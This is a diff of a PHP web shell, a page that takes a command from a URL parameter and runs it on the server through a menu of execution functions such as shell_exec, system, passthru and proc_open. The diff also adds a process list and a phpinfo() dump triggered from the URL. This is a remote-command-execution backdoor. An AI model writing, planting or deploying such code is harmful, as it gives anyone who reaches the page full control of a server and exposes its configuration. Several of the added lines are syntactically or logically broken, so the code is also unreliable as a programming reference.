@@ -18,25 +18,43 @@ $iget = <<<'IGET'
 <div align="left" name="in">
 <form action ="?" method="get" style="margin-left:10%;">
 <fieldset>
-	<br/><input type="text" name="cmd" style="width:450px;height:50px;">
+	<br/><input type="text" name="cmd" style="width:550px;height:50px;">
 	<br/><select name="function" style="width:30%" style="padding-right:4%;">
-		<option value="sexec">shell_exec [unix(sh)/win(cmd.exe)]</option>
-		<option value="sys">system [unix(sh)/win(cmd.exe)]</option>
-		<option value="exe">exec [unix(sh/suexec)/win(cmd.exe)]</option>
-		<option value"exebg">execBackground(custom function) [unix(sd/suexec)/win(cmd, no window)]</option>
-		<option value="pthru">passthru [unix/win]</option>
-		<option value="popn">popen [unix/win]</option>
-		<option value="procopen">proc_open [unix]</option>
-		<option value="backticks">backticks [unix]</option>
-		<option value="pcntlexe">pcntl_exec [unix](requires absolute path)</option>
-	</select>
-	<input type="checkbox" name="process" value="isProcess" style="padding-left=10px"> run process
+IGET;
+$optvals = array(
+	"backticks" => "backticks [unix]",
+	"exe" => "exec [unix(sh/suexec)/win(cmd.exe)]",
+	"exebg" => "execBackground(custom function) [unix(sd/suexec)/win(cmd, no window)]",
+	"pcntlexe" => "pcntl_exec [unix]",
+	"pthru" => "passthru [unix/win]",
+	"popen" => "popen [unix/win]",
+	"procopen" => "proc_open [unix]",
+	"sexec" => "shell_exec [unix(sh)/win(cmd.exe)]",
+	"sys" => "system [unix(sh)/win(cmd.exe)]"
+);
+
+function ugot($optvals){
+       	foreach($optvals as $v => $val){
+		echo '<option value ="' . $v . '">' . $val . '</option>';	
+	}	
+}
+
+$igot = '	</select>
+	<input type="checkbox" name="process" value="isProcess" style="padding-left=10px"> run as process?
 	<input type="submit" value="submit" style="padding-left=25px;">
 </fieldset>
 </form>
-</div>
-IGET;
-print $iget;
+</div>';
+
+echo $iget;
+ugot($optvals);
+echo $igot;
+
+
+//print status
+foreach ($pro as $x) {
+	$x.dispProc();
+}
 
 
 //classes for custom rce stdio
@@ -95,6 +113,9 @@ class Process{
 			return false;
 		}
 	}
+	public function dispProc(){
+		echo $this->pid .' '. $this->cmd .'<input type="submit" value="kill" style="padding-left=10px;">';
+	}
 }
 
 
@@ -130,7 +151,9 @@ function stdout($cmd) {
 		//DO WORK HERE
 		//THIS IS WHERE class object returns code for jobbing
 		//e.g. cmd = ProcessName->cmd . $_GET($cmd);
-		proc($cmd);
+		$prefix = proc($cmd);
+		$prefix .= $cmd;
+		$cmd = prefix;
 	}
 	echo '<br/><br/><div name="out" style="margin-left:10%;">';
 	switch ($_GET["function"]) {
@@ -171,11 +194,17 @@ function stdout($cmd) {
 			$rets = "";
 			system($cmd, $rets);
 			print $rets;
+		default:
+			
 
 	}
 echo	'</div>';
 }
-
+print(stdout());
+echo '<br/';
+if ($_GET[$pinfo]=pinfo) {
+	echo phpinfo();
+}
 echo '</body>';
 echo '</html>';
 
